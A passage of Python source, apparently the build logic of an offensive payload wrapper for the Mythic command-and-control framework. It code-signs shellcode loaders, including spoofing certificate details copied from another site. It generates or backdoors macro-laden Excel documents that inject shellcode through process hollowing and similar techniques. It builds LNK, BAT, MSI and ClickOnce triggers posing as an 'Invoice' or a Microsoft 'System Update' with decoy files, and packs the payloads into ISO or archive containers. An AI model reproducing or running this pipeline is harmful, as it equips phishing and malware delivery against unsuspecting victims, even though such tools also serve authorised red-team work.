                            StepStdout="Failed to locate executable",
                            StepSuccess=False,
                        ))
                        return response
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Compiling ClickOnce Loader",
                        StepStdout="ClickOnce Loader Compiled!",
                        StepSuccess=True,
                    ))
                    output = ""

            ######################### End Of Shellcode Loader Section #########################
            ######################### Code Signing Section #########################
            if self.get_parameter("6.0 Codesign Loader"):
                try:
                    if self.get_parameter("0.0 Main Payload Type") == "Loader":
                        payload_path = Path(agent_build_path) / "payload" / "erebus.exe"
                    else:
                        payload_path = Path(agent_build_path) / "payload" / dll_file_name


                    if not payload_path.exists():
                        raise FileNotFoundError(f"Payload not found for signing at: {payload_path}")

                    signing_type = self.get_parameter("6.1 Codesign Type")
                    success_msg = ""

                    if signing_type == "SelfSign":
                        cn = self.get_parameter("6.2 Codesign CN")
                        org = self.get_parameter("6.3 Codesign Orgname") or cn

                        self_sign_payload(
                            payload_path=payload_path,
                            subject_cn=cn,
                            org_name=org
                        )
                        success_msg = f"Self-signed with CN: {cn}"

                    elif signing_type == "Spoof URL":
                        target_url = self.get_parameter("6.4 Codesign Spoof URL")
                        if not target_url:
                            raise ValueError("No URL provided for spoofing")

                        cert_details = get_remote_cert_details(target_url)
                        self_sign_payload(
                            payload_path=payload_path,
                            subject_cn=cert_details["CN"],
                            org_name=cert_details["O"],
                            full_details=cert_details
                        )
                        success_msg = f"Spoofed {target_url} (CN: {cert_details['CN']})"

                    elif signing_type == "Provide Certificate":
                        cert_uuid = self.get_parameter("6.5 Codesign Cert")
                        cert_pass = self.get_parameter("6.6 Codesign Cert Password")

                        if not cert_uuid:
                            raise ValueError("No certificate file uploaded")

                        file_resp = await SendMythicRPCFileGetContent(
                            MythicRPCFileGetContentMessage(AgentFileId=cert_uuid)
                        )

                        if not file_resp.Success:
                            raise ValueError("Failed to retrieve certificate file")

                        cert_path = Path(agent_build_path) / "uploaded_cert.pfx"
                        cert_path.write_bytes(file_resp.Content)

                        sign_with_provided_cert(
                            payload_path=payload_path,
                            cert_path=cert_path,
                            cert_password=cert_pass
                        )
                        success_msg = "Signed with provided certificate"

                    elif signing_type == "Provide Certificate":
                        raise NotImplementedError("Provide Certificate mode not yet implemented in backend")

                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Sign Shellcode Loader",
                        StepStdout=f"Success: {success_msg}",
                        StepSuccess=True
                    ))

                except Exception as e:
                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Sign Shellcode Loader",
                        StepStdout=f"Signing Failed: {str(e)}",
                        StepSuccess=False
                    ))
                    response.status = BuildStatus.Error
                    response.build_stderr = f"Code signing failed: {str(e)}"
                    return response

            ######################### Creating Decoy Section #########################
            if self.get_parameter("0.13 Decoy File Inclusion"):
                decoy_dir = Path(agent_build_path) / "decoys"
                decoy_file_uuid = self.get_parameter("0.13 Decoy File")

                if decoy_file_uuid:
                    try:
                        file_resp = await SendMythicRPCFileGetContent(
                            MythicRPCFileGetContentMessage(AgentFileId=decoy_file_uuid)
                        )

                        file_name_resp = await SendMythicRPCFileSearch(
                            MythicRPCFileSearchMessage(AgentFileID=decoy_file_uuid)
                        )
                        custom_filename = "decoy.pdf"
                        if file_name_resp.Success and len(file_name_resp.Files) > 0:
                            custom_filename = file_name_resp.Files[0].Filename

                        if decoy_dir.exists():
                            shutil.rmtree(decoy_dir)
                        decoy_dir.mkdir(parents=True, exist_ok=True)
                        custom_decoy_path = decoy_dir / custom_filename
                        custom_decoy_path.write_bytes(file_resp.Content)

                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                                PayloadUUID=self.uuid,
                                StepName="Creating Decoy",
                                StepStdout=f"Replaced default decoys with custom file: {custom_filename}",
                                StepSuccess=True
                            ))

                    except Exception as e:
                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                                PayloadUUID=self.uuid,
                                StepName="Creating Decoy",
                                StepStdout=f"Failed to process custom decoy: {str(e)}",
                                StepSuccess=False
                            ))
                else:
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Creating Decoy",
                            StepStdout="Using default decoy files.",
                            StepSuccess=True
                        ))
            ######################### End of Decoy Section #########################
            ######################### MalDoc Creation Section #########################
            maldoc_mode = self.get_parameter("0.9 Create MalDoc")

            if maldoc_mode != "None" and self.get_parameter("0.8 Output Extension Source") == "Trigger":
                await SendMythicRPCPayloadUpdatebuildStep(
                    MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Creating MalDoc",
                        StepStdout="Skipping MalDoc Generation (Trigger selected as source).",
                        StepSuccess=True
                    ))

            if maldoc_mode != "None" and self.get_parameter("0.8 Output Extension Source") != "Trigger":
                payload_dir = Path(agent_build_path) / "payload"
                maldoc_type = self.get_parameter("0.9a MalDoc Type")
                vba_trigger = self.get_parameter("0.9c VBA Execution Trigger")
                doc_name = self.get_parameter("0.9d Excel Document Name")
                obfuscate = self.get_parameter("0.9e Obfuscate VBA")
                injection_type = self.get_parameter("0.9f MalDoc Injection Type")

                try:
                    # Generate VBA payload code based on injection type
                    if injection_type == "Command Execution":
                        # Use WScript.Shell to execute trigger binary and command
                        trigger_binary = self.get_parameter("0.9a Trigger Binary")
                        trigger_command = self.get_parameter("0.9b Trigger Command")

                        # Import the plugin function to generate command execution VBA
                        from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin
                        plugin = PayloadMalDocsPlugin()
                        vba_code = plugin.generate_command_execution_vba(
                            trigger_binary=trigger_binary,
                            trigger_command=trigger_command,
                            trigger_type=vba_trigger
                        )

                    else:  # Shellcode Injection
                        # Convert shellcode to VBA format using shellcrypt
                        # First, generate the VBA-formatted shellcode
                        cmd = [
                            "python",
                            shellcrypt_path,
                            "-i", mythic_shellcode_path,
                            "-e", ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
                            "-f", "vba",
                            "-a", "shellcode"
                        ]

                        if self.get_parameter("2.2 Encryption Key") != "NONE":
                            cmd += ["-k", self.get_parameter("2.2 Encryption Key")]

                        if self.get_parameter("2.0 Compression Type") != "NONE":
                            cmd += ["-c", COMPRESSION_METHODS[self.get_parameter("2.0 Compression Type")]]

                        # Run shellcrypt to get VBA shellcode
                        shellcode_output = subprocess.check_output(cmd, text=True)
                        output += f"[DEBUG] Shellcrypt raw output length: {len(shellcode_output)} bytes\n"

                        # Parse shellcrypt output to extract only key and shellcode arrays
                        shellcode_vba = ""
                        lines = shellcode_output.split('\n')
                        in_key = False
                        in_shellcode = False
                        key_lines = []
                        shellcode_lines = []

                        for line in lines:
                            # Capture key array
                            if 'key = Array' in line:
                                in_key = True
                                in_shellcode = False
                                key_lines.append(line.strip())
                            elif in_key:
                                if line.strip().endswith(')'):
                                    key_lines.append(line.strip())
                                    in_key = False
                                elif line.strip():
                                    key_lines.append(line.strip())

                            # Capture shellcode array
                            if 'shellcode = Array' in line:
                                in_shellcode = True
                                in_key = False
                                shellcode_lines.append(line.strip())
                            elif in_shellcode:
                                if line.strip().endswith(')'):
                                    shellcode_lines.append(line.strip())
                                    in_shellcode = False
                                elif line.strip():
                                    shellcode_lines.append(line.strip())

                        # Combine extracted lines
                        if key_lines:
                            shellcode_vba += ' '.join(key_lines) + '\n'
                        if shellcode_lines:
                            shellcode_vba += ' '.join(shellcode_lines) + '\n'

                        output += f"[DEBUG] Parsed shellcode_vba length: {len(shellcode_vba)} bytes\n"

                        # Map loader selection to plugin parameter
                        loader_map = {
                            "VirtualAlloc + CreateThread": "createthread",
                            "EnumSystemLocalesA Callback": "enumlocales",
                            "QueueUserAPC Injection": "queueuserapc",
                            "Process Hollowing": "hollowing"
                        }
                        loader_type = loader_map.get(self.get_parameter("0.9g VBA Loader Technique"), "createthread")
                        output += f"[DEBUG] Using VBA loader technique: {loader_type}\n"

                        # Get target process for hollowing technique
                        target_process = self.get_parameter("0.5 Shellcode Loader - Target Process")
                        output += f"[DEBUG] Target process: {target_process}\n"

                        # Generate VBA that injects the shellcode
                        from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin
                        plugin = PayloadMalDocsPlugin()
                        vba_code = plugin.generate_shellcode_injection_vba(
                            vba_shellcode=shellcode_vba,
                            trigger_type=vba_trigger,
                            loader_type=loader_type,
                            target_process=target_process
                        )

                    if obfuscate:
                        vba_code = await self.obfuscate_vba(vba_code)

                    # Handle VBA Module Only export
                    if maldoc_mode == "VBA Module Only":
                        from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin
                        plugin = PayloadMalDocsPlugin()

                        # Export as .bas file (importable VBA module)
                        bas_output = payload_dir / f"{doc_name}_payload.bas"
                        bas_path = plugin.export_vba_as_bas(
                            vba_code=vba_code,
                            output_path=str(bas_output),
                            module_name=doc_name
                        )

                        # Also export as plain text for reference
                        txt_output = payload_dir / f"{doc_name}_payload.txt"
                        plugin.export_vba_as_text(vba_code, str(txt_output))

                        success_msg = f"[+] Created VBA module for manual import: {bas_path.name}\n"
                        success_msg += f"[*] .bas file can be imported into Excel via VBA Editor > File > Import\n"
                        success_msg += f"[*] .txt file contains the raw VBA code for reference"

                        output += success_msg + "\n"

                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                                PayloadUUID=self.uuid,
                                StepName="Creating MalDoc",
                                StepStdout=success_msg,
                                StepSuccess=True
                            ))

                    elif maldoc_type == "Create New":
                        # Create a new Excel document
                        excel_output = payload_dir / f"{doc_name}.xlsm"
                        excel_path = generate_excel_payload(
                            payload_path=str(payload_dir),
                            vba_payload=vba_code,
                            output_path=excel_output
                        )

                        success_msg = f"Created malicious Excel document: {excel_path.name}"

                    else:  # Backdoor Existing
                        # Get the uploaded Excel file
                        excel_uuid = self.get_parameter("0.9b Excel Source File")
                        if not excel_uuid:
                            raise ValueError("No Excel file provided for backdooring")

                        file_resp = await SendMythicRPCFileGetContent(
                            MythicRPCFileGetContentMessage(AgentFileId=excel_uuid)
                        )

                        if not file_resp.Success:
                            raise ValueError("Failed to retrieve Excel file")

                        # Get original filename
                        file_name_resp = await SendMythicRPCFileSearch(
                            MythicRPCFileSearchMessage(AgentFileID=excel_uuid)
                        )

                        original_filename = "document.xlsm"
                        if file_name_resp.Success and len(file_name_resp.Files) > 0:
                            original_filename = file_name_resp.Files[0].Filename

                        # Save the uploaded file temporarily
                        temp_excel = Path(tempfile.gettempdir()) / f"source_{excel_uuid}.xlsx"
                        temp_excel.write_bytes(file_resp.Content)

                        # Backdoor the Excel file
                        output_name = f"{Path(original_filename).stem}_backdoored.xlsm"
                        excel_output = payload_dir / output_name

                        excel_path = backdoor_existing_excel(
                            source_excel=str(temp_excel),
                            vba_payload=vba_code,
                            output_path=excel_output
                        )

                        # Cleanup temp file
                        temp_excel.unlink(missing_ok=True)

                        success_msg = f"Backdoored Excel document: {excel_path.name}"

                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Creating MalDoc",
                            StepStdout=success_msg,
                            StepSuccess=True
                        ))

                except Exception as e:
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Creating MalDoc",
                            StepStdout=f"Failed to create/backdoor Excel document: {str(e)}",
                            StepSuccess=False
                        ))
                    response.status = BuildStatus.Error
                    response.build_stderr = f"MalDoc creation failed: {str(e)}"
                    return response

            ######################### End of MalDoc Section #########################
            ######################### Trigger Generation Section #########################

            if self.get_parameter("0.0 Main Payload Type") == "Loader" and self.get_parameter("0.8 Output Extension Source") == "MalDoc":
                await SendMythicRPCPayloadUpdatebuildStep(
                    MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Adding Trigger",
                    StepStdout="Skipping Trigger Generation (MalDoc selected as source).",
                    StepSuccess=True,
                ))

            if self.get_parameter("0.0 Main Payload Type") == "Loader" and self.get_parameter("0.8 Output Extension Source") != "MalDoc":

                payload_dir = Path(agent_build_path) / "payload"
                decoy_dir = Path(agent_build_path) / "decoys"
                decoy_file = decoy_dir / "decoy.pdf"

                trigger_type = self.get_parameter("0.9 Trigger Type")

                try:
                    trigger_path = ""

                    match trigger_type:
                        case "LNK":
                            trigger_path = create_payload_trigger(
                                target_bin=str(self.get_parameter("0.9a Trigger Binary")),
                                args=str(self.get_parameter("0.9b Trigger Command")),
                                icon_src=r"C:\\Windows\\System32\\imageres.dll",
                                icon_index=0,
                                description="Invoice",
                                payload_dir=payload_dir,
                                decoy_file=decoy_file
                            )

                        case "BAT":
                            trigger_path = create_bat_payload_trigger(
                                target_bin=str(self.get_parameter("0.9a Trigger Binary")),
                                args=str(self.get_parameter("0.9b Trigger Command")),
                                payload_dir=payload_dir,
                                decoy_file=decoy_file
                            )

                        case "MSI":
                            trigger_path= create_msi_payload_trigger(
                                payload_exe="erebus.exe",
                                payload_dir=payload_dir,
                                decoy_file=decoy_file
                            )
                        case "ClickOnce":
                            trigger_path = await create_clickonce_trigger(
                                payload_exe="erebus.exe",
                                payload_dir=payload_dir,
                                decoy_file=decoy_file,
                                app_name="System Update",
                                app_publisher="Microsoft Corporation"
                            )

                    if trigger_path:
                        response.status = BuildStatus.Success
                        response.build_message = f"{trigger_type} Trigger created!"

                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="Adding Trigger",
                            StepStdout=f"{trigger_type} Trigger created at: {trigger_path}",
                            StepSuccess=True,
                        ))
                except Exception as e:
                    response.status = BuildStatus.Error
                    response.build_message = f"Failed to create {trigger_type} trigger: {str(e)}"
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Adding Trigger",
                        StepStdout=f"CRITICAL ERROR: Failed to create {trigger_type} trigger: {str(e)}",
                        StepSuccess=False,
                    ))
                    return response
            ######################### End Of Trigger Generation Section #########################
            ######################### MSI Backdooring Section #########################

            # Backdoor MSI if user uploaded one (adds backdoored MSI to payload directory)
            await self.backdoor_msi_payload(agent_build_path)

            ######################### End Of MSI Backdooring Section #########################
            ######################### Final Payload / Container #########################

            # 1. Capture context for container function
            if 'payload_path' in locals():
                final_path = payload_path
            else:
                final_path = obfuscated_shellcode_path

            self.generated_payload_path = final_path
            self.agent_build_path = agent_build_path

            # 2. Attempt Containerization
            container_path = await self.containerise_payload(agent_build_path)

            if container_path:
                # Case A: Container created (7z/MSI)
                with open(container_path, "rb") as f:
                    response.payload = f.read()

                container = self.get_parameter("3.0 Container Type")
                match container:
                    case "7z":
                        ext = "7z"
                    case "Zip":
                        ext = "zip"
                    case "MSI":
                        ext = "msi"
                    case "ISO":
                        ext = "iso"
                    case _:
                        ext = "bin"

                response.updated_filename = f"payload.{ext}"
                response.status = BuildStatus.Success
                response.build_message = f"Success! Containerized ({container})"

                await SendMythicRPCPayloadUpdatebuildStep(
                    MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Containerising",
                    StepStdout=f"Payload packaged into {container} container",
                    StepSuccess=True,
                ))

            return response

        except Exception as e:
            response.status = BuildStatus.Error
            response.build_message = f"Error building wrapper: {str(e)}\n{output}"
            return response
